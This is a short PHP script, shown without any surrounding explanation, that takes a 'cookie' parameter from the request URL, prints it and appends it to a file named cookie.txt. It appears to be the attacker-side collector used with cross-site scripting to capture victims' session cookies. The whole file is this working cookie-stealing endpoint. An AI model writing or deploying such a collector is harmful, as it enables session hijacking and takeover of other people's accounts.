<?php 
$cookie = $_GET['cookie']; 
var_dump($cookie); 
$myFile = "cookie.txt"; 
file_put_contents($myFile, $cookie); 
?> 